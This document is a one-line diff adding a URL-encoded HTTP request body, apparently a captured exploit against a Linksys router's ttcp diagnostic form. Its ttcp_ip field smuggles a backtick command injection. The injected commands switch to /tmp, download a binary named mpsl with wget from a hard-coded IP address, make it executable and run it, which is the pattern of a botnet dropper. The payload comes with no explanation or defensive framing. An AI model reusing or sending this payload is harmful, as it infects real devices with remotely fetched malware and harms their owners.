@@ -1,0 +1,1 @@
+ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+Amakano.mpsl%3B+wget+http%3A%2F%2F192.210.162.147%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1
